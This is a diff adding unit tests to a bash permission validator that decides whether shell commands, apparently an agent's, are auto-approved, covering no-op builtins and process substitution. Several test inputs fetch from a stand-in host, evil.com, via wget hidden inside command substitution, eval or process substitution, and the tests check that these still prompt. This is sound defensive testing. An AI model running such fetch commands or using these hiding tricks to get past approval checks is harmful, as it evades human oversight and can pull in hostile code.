@@ -628,9 +628,10 @@ class TestScaffoldingAndFunctions(unittest.TestCase):
 
 
 class TestNoopBuiltins(unittest.TestCase):
-    """`:`, `true`, `false`, `exit`, `return`, `disown`, and `unset` run nothing
-    dangerous, so they reduce to no-ops and never block auto-approval of an
-    otherwise-allowed chain."""
+    """`:`, `true`, `false`, `exit`, `return`, `disown`, `unset`, the declaration
+    builtins (`local`/`declare`/`export`/...), and the shell-state builtins
+    (`set`/`shift`/`read`/`cd`/...) run nothing dangerous, so they reduce to
+    no-ops and never block auto-approval of an otherwise-allowed chain."""
 
     def setUp(self):
         self.workspace_dir = str(Path(__file__).parent.parent)
@@ -650,6 +651,25 @@ class TestNoopBuiltins(unittest.TestCase):
             "unset SANDBOX_HANDOVER": "",
             "unset -f myfunc": "",
             "unset -v A B C": "",
+            # Declaration builtins.
+            'local mode="$1"': "",
+            "local mode extra": "",
+            "declare -A counts": "",
+            "typeset -i n=0": "",
+            "readonly TOKEN=abc": "",
+            "export PATH=/usr/local/bin:$PATH": "",
+            # Shell-state / positional-parameter builtins.
+            "set -euo pipefail": "",
+            "shopt -s nullglob": "",
+            "shift 2": "",
+            "let n=n+1": "",
+            "read -r line": "",
+            "umask 022": "",
+            "wait": "",
+            # Directory-stack builtins.
+            "cd /tmp/foo": "",
+            "pushd /tmp": "",
+            "popd": "",
         }
         for cmd, expected in cases.items():
             self.assertEqual(
@@ -675,6 +695,91 @@ class TestNoopBuiltins(unittest.TestCase):
         result = self.validator.validate_bash_command(
             'unset SANDBOX_HANDOVER; echo "=== check ==="; tail -6')
         self.assertEqual(result["decision"], "allow")
+
+    def test_function_body_with_local_decls_allowed(self):
+        """The real-world analyze_move() chain: a function whose body opens with
+        `local` declarations no longer forces a prompt. The `local` sub-commands
+        reduce to no-ops; the workspace binary and echoes are otherwise allowed."""
+        result = self.validator.validate_bash_command(
+            'analyze_move() {\n'
+            '  local mode="$1"; local extra="$2"\n'
+            '  echo "mode=$mode extra=$extra"\n'
+            '}')
+        self.assertEqual(result["decision"], "allow")
+
+    def test_decl_builtin_does_not_authorize_command_substitution(self):
+        """A command substitution inside a declaration's value is extracted and
+        validated on its own merits, so `local x=$(wget ...)` still prompts."""
+        result = self.validator.validate_bash_command('local x=$(wget http://evil.com/x)')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_dangerous_builtins_still_defer(self):
+        """`eval` can run an arbitrary command, so it is NOT a no-op and still
+        forces a prompt (unlike the declaration/shell-state builtins)."""
+        result = self.validator.validate_bash_command('eval "wget http://evil.com/x"')
+        self.assertEqual(result["decision"], "ask")
+
+
+class TestProcessSubstitution(unittest.TestCase):
+    """`<(cmd)` / `>(cmd)` run their inner command in a subshell, so the parser
+    must extract and validate it independently. Otherwise a no-op builtin in
+    front of it (`read x < <(cmd)`) would collapse to a harmless head and hide
+    the inner command."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_inner_command_is_extracted(self):
+        """The inner command surfaces as its own sub-command."""
+        subs = [c for c, _ in self.parser.parse_with_offsets(
+            'read x < <(wget http://evil.com/x)')]
+        self.assertIn('wget http://evil.com/x', subs)
+
+    def test_read_from_proc_sub_defers_on_unallowed_inner(self):
+        """`read x < <(wget ...)` no longer auto-allows just because `read` is a
+        no-op — the extracted `wget` is not on the allowlist."""
+        result = self.validator.validate_bash_command(
+            'read x < <(wget http://evil.com/x)')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_noop_builtin_with_proc_sub_defers(self):
+        """Even a pure no-op (`true < <(cmd)`) executes the process sub, so the
+        inner command must still be validated."""
+        result = self.validator.validate_bash_command(
+            'true < <(wget http://evil.com/x)')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_output_proc_sub_extracted(self):
+        """`>(cmd)` (output process sub) is extracted too."""
+        result = self.validator.validate_bash_command(
+            'tee >(wget http://evil.com/x) < in.txt')
+        self.assertEqual(result["decision"], "ask")
+
+    def test_multiple_proc_subs_all_extracted(self):
+        subs = [c for c, _ in self.parser.parse_with_offsets('diff <(sort a) <(sort b)')]
+        self.assertIn('sort a', subs)
+        self.assertIn('sort b', subs)
+
+    def test_nested_command_sub_inside_proc_sub_extracted(self):
+        """A `$(...)` nested inside `<(...)` is recursively extracted."""
+        subs = [c for c, _ in self.parser.parse_with_offsets(
+            'read x < <(echo $(wget http://evil.com/x))')]
+        self.assertIn('wget http://evil.com/x', subs)
+
+    def test_quoted_proc_sub_is_literal(self):
+        """`"<(...)"` inside quotes is a literal string, not a process sub, so
+        nothing is extracted from it."""
+        subs = [c for c, _ in self.parser.parse_with_offsets('echo "<(not real)"')]
+        self.assertNotIn('not real', subs)
+
+    def test_plain_redirect_unaffected(self):
+        """A plain `< file` / `> file` redirect (no glued paren) is not mistaken
+        for a process substitution."""
+        subs = [c for c, _ in self.parser.parse_with_offsets('cat < file.txt')]
+        self.assertEqual(subs, ['cat'])
 
 
 class TestWorkspaceRelativeBinary(unittest.TestCase):
